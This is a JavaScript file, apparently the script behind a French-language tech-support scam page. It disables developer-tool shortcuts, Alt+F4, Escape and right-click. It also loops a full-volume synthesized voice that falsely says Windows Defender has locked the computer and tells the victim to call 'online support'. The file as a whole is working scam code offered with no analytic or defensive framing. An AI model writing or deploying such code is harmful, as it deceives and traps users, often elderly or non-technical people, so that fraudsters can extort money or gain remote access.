console.log('Script.js chargé');

// Bloquer les raccourcis clavier et le menu contextuel
document.addEventListener('keydown', function(event) {
    // F12 - Outils de développement
    if (event.key === 'F12') {
        event.preventDefault();
        console.log('F12 bloqué');
        return false;
    }

    // Ctrl+Shift+I - Inspecteur
    if (event.ctrlKey && event.shiftKey && event.key === 'I') {
        event.preventDefault();
        console.log('Ctrl+Shift+I bloqué');
        return false;
    }

    // Ctrl+Shift+C - Sélecteur d'éléments
    if (event.ctrlKey && event.shiftKey && event.key === 'C') {
        event.preventDefault();
        console.log('Ctrl+Shift+C bloqué');
        return false;
    }

    // Ctrl+Shift+K - Console
    if (event.ctrlKey && event.shiftKey && event.key === 'K') {
        event.preventDefault();
        console.log('Ctrl+Shift+K bloqué');
        return false;
    }

    // Alt+F4 - Fermer la fenêtre
    if (event.altKey && event.key === 'F4') {
        event.preventDefault();
        console.log('Alt+F4 bloqué');
        return false;
    }

    // Escape - Fermer les menus/outils
    if (event.key === 'Escape') {
        event.preventDefault();
        console.log('Escape bloqué');
        return false;
    }
});

// Bloquer le menu contextuel (clic droit)
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    console.log('Menu contextuel bloqué');
    return false;
});

// Variable globale pour contrôler la boucle
let isVoiceActive = true;
let currentUtterance = null;

// Variable pour tracker la partie du message
let messageIndex = 0;
let messageParts = [
    "Vous êtes en présence d'un malveillant.",
    "Windows Defender a verrouillé votre ordinateur pour sécuriser vos données confidentielles.",
    "N'éteignez surtout pas votre ordinateur pour ne pas perdre vos données.",
    "Veuillez contacter l'assistance en ligne."
];

// Fonction pour lire le message vocal en boucle
function playMessage() {
    if (!isVoiceActive) {
        console.log('Lecture vocale désactivée');
        return;
    }

    const messageText = messageParts[messageIndex];
    
    console.log('Lecture partie ' + (messageIndex + 1) + '/' + messageParts.length + ': ' + messageText);
    
    // Créer une nouvelle utterance
    currentUtterance = new SpeechSynthesisUtterance(messageText);
    currentUtterance.lang = 'fr-FR';
    currentUtterance.volume = 1.0;
    currentUtterance.rate = 0.9;
    currentUtterance.pitch = 1.0;
    
    // Événement quand la parole commence
    currentUtterance.onstart = function() {
        console.log('✓ Partie ' + (messageIndex + 1) + ' COMMENCÉE');
    };
    
    // Événement quand la parole se termine
    currentUtterance.onend = function() {
        console.log('✓ Partie ' + (messageIndex + 1) + ' TERMINÉE');
        
        // Passer à la partie suivante
        messageIndex++;
        
        // Si on a fini le dernier message, recommencer la boucle
        if (messageIndex >= messageParts.length) {
            messageIndex = 0;
            console.log('Fin de la boucle complète, redémarrage...');
            setTimeout(function() {
                if (isVoiceActive) {
                    playMessage();
                }
            }, 500);
        } else {
            // Sinon, jouer la partie suivante immédiatement
            setTimeout(function() {
                if (isVoiceActive) {
                    playMessage();
                }
            }, 100);
        }
    };
    
    // Gestion des erreurs
    currentUtterance.onerror = function(event) {
        console.error('❌ Erreur partie ' + (messageIndex + 1) + ':', event.error);
        
        setTimeout(function() {
            if (isVoiceActive) {
                console.log('Nouvelle tentative...');
                playMessage();
            }
        }, 1000);
    };
    
    // Lancer la parole (sans cancel() pour éviter les interruptions)
    try {
        console.log('Appel speak() pour la partie ' + (messageIndex + 1) + '...');
        speechSynthesis.speak(currentUtterance);
    } catch(e) {
        console.error('❌ Erreur speak():', e);
    }
}

// Initialiser la lecture vocale au chargement de la page
document.addEventListener('DOMContentLoaded', function() {
    console.log('=== DOMContentLoaded déclenché ===');
    
    // Attendre que le DOM soit complètement prêt
    setTimeout(function() {
        console.log('Démarrage de la lecture vocale...');
        playMessage();
    }, 300);
});

// Fallback si DOMContentLoaded ne se déclenche pas
window.addEventListener('load', function() {
    console.log('=== Window.load déclenché ===');
    
    if (!speechSynthesis.speaking && !currentUtterance) {
        setTimeout(function() {
            console.log('Démarrage de la lecture vocale (fallback)...');
            playMessage();
        }, 300);
    }
});

// Aussi déclencher au clic de l'utilisateur (nécessaire sur certains navigateurs)
document.addEventListener('click', function() {
    if (!speechSynthesis.speaking && isVoiceActive && !currentUtterance) {
        console.log('Démarrage de la voix suite au clic utilisateur');
        playMessage();
    }
}, { once: true });

// Afficher la configuration dans la console
console.log('=== CONFIGURATION VOCALE ===');
console.log('Volume: 1.0 (MAXIMUM)');
console.log('Rate: 0.9');
console.log('Pitch: 1.0');
console.log('Langue: fr-FR (Français)');
console.log('Message divisé en 4 parties');
console.log('========================');

// Vérifier la disponibilité de la synthèse vocale
if (!('speechSynthesis' in window)) {
    console.error('❌ Web Speech API non disponible');
} else {
    console.log('✓ Web Speech API disponible');
}

// Maintenir la synthèse vocale active
setInterval(function() {
    if (isVoiceActive && speechSynthesis.paused) {
        speechSynthesis.resume();
        console.log('Synthèse vocale reprise');
    }
}, 50);
